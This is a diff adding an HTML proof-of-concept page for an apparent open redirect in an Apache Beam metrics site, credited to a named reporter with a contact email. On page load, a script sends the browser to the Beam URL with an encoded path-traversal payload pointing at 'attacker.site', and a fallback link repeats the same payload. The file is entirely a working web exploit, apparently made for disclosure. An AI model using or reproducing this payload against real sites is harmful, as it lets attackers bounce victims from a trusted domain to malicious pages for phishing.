@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Apache Beam Open Redirect PoC</title>
+  <meta name="author" content="Davi Johns">
+  <meta name="contact" content="davijohns330@gmail.com">
+  <script>
+    // Redirect to Apache Beam vulnerable endpoint
+    window.location.href = "https://metrics.beam.apache.org/public/..%2F%5cattacker.site%2F%3f%2F..%2F..";
+  </script>
+</head>
+<body>
+  <h1>Apache Beam Open Redirect Demo</h1>
+  <p>If you're not redirected automatically, <a href="https://metrics.beam.apache.org/public/..%2F%5cattacker.site%2F%3f%2F..%2F..">click here</a>.</p>
+  <footer>
+    <small>Reported by Davi Johns | Contact: davijohns330@gmail.com</small>
+  </footer>
+</body>
+</html>
